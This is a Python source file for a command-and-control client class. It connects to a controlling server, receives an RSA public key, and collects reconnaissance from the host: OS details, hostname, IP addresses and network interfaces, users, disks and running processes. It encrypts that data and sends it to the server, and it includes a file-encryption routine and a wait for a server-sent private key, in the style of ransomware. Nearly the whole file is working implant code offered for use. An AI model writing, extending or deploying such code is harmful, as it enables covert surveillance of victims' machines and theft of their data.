import socket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import platform
import getpass
import psutil  # Requires 'psutil' package
import json
import uuid

class C2Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect_to_server(self):
        self.client_socket.connect((self.host, self.port))
        print(f"Connected to server at {self.host}:{self.port}")

    def receive_public_key(self):
        # Receive the public key from the server
        public_key_pem = self.client_socket.recv(4096)  # Adjust size as needed
        public_key = serialization.load_pem_public_key(
            public_key_pem,
            backend=default_backend()
        )

        # Serialize the public key to PEM format for printing
        public_key_pem_printable = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        # Decode the PEM bytes to a string and print
        print(public_key_pem_printable.decode('utf-8'))

        return public_key # this is still a cryptolib obj

    def encrypt_file(self, public_key, file_path):
        # Encrypt the file using the public key
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        ciphertext = public_key.encrypt(
            plaintext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return ciphertext

    def wait_for_private_key(self):
        print("Waiting for private key from the server...")
        while True:
            data = self.client_socket.recv(4096)  # Adjust buffer size as needed
            if data:
                print("Received data from server.")
                # Assuming the data is the private key; handle accordingly
                try:
                    private_key = serialization.load_pem_private_key(
                        data,
                        password=None,
                        backend=default_backend()
                    )
                    print("Private key received from server.")

                    # Save the private key to a file
                    private_key_file_path = 'received_private_key.pem'
                    with open(private_key_file_path, 'wb') as key_file:
                        key_file.write(data)  # Write the PEM-encoded private key data
    
                    # Read the saved private key file and print its contents
                    with open(private_key_file_path, 'r') as key_file:
                        print(key_file.read())
    
                    return private_key  # Optionally return the private key object

                except ValueError as e:
                    print("Received data is not a valid private key:", e)
                break  # Exit loop and close connection after receiving the key

        self.client_socket.close()
        print("Connection closed.")

    def gather_system_info(self):
        # Basic OS and hardware information
        system_info = {
            'OS': platform.system(),
            'OS Release': platform.release(),
            'OS Version': platform.version(),
            'Architecture': platform.machine(),
            'Hostname': socket.gethostname(),
            'Processor': platform.processor(),
            'Physical Cores': psutil.cpu_count(logical=False),
            'Total Cores': psutil.cpu_count(logical=True),
            'RAM': str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB",
        }

        # Attempt to get the IP address, handle potential error
        try:
            system_info['IP Address'] = socket.gethostbyname(socket.gethostname())
        except socket.gaierror:
            system_info['IP Address'] = 'Unable to resolve IP'

        # Also gather network info from interfaces
        system_info['Network Interfaces'] = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:  # IPv4
                    system_info['Network Interfaces'].append({
                        'Interface': interface,
                        'IP Address': addr.address,
                        'Netmask': addr.netmask,
                        'Broadcast IP': addr.broadcast
                    })

        # User information
        system_info['Current User'] = getpass.getuser()
        system_info['Users'] = [user.name for user in psutil.users()]

        # Disk information
        system_info['Disks'] = [
            {
                'Device': disk.device,
                'Mountpoint': disk.mountpoint,
                'Fstype': disk.fstype,
                'Total Size': str(round(psutil.disk_usage(disk.mountpoint).total / (1024.0 **3))) + " GB",
            } for disk in psutil.disk_partitions()
        ]

        # Running processes (this can be very verbose)
        system_info['Processes'] = [
            {
                'pid': p.info['pid'],
                'name': p.info['name'],
                'username': p.info['username'],
            } for p in psutil.process_iter(['pid', 'name', 'username'])
        ]

        return system_info

    def send_system_info(self, public_key):
        system_info = self.gather_system_info()
        info_str = json.dumps(system_info, indent=4)  # Convert dict to JSON string for readability
        info_bytes = info_str.encode('utf-8')

        print("Attempting to encrypt data in chunks")
        # Adjust the maximum chunk size to accommodate padding overhead
        max_chunk_size = 190  # Adjust this value as needed, generally less than key size in bytes due to padding

        # Split the original data into chunks
        chunks = [info_bytes[i:i + max_chunk_size] for i in range(0, len(info_bytes), max_chunk_size)]

        for chunk in chunks:
            # Encrypt each chunk using the server's public key
            encrypted_chunk = public_key.encrypt(
                chunk,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            # Send the encrypted chunk to the server
            self.client_socket.sendall(encrypted_chunk)

        print("Successfully encrypted and sent data in chunks")

        # Optionally, send a special delimiter or signal to indicate the end of transmission
        # Ensure this is something that won't naturally occur in your encrypted data
        print("Sending end signal")
        end_signal = b'EOF'
        self.client_socket.sendall(end_signal)

    def run(self):
        self.connect_to_server()
        public_key = self.receive_public_key()

        # Send system information after receiving the public key
        self.send_system_info(public_key)

        # Optionally encrypt a file with the public key
        # file_path = 'path/to/your/file'  # Specify the path to your file
        # encrypted_data = self.encrypt_file(public_key, file_path)

        private_key = self.wait_for_private_key()

if __name__ == '__main__':
    c2_client = C2Client("localhost", 8888)
    c2_client.run()
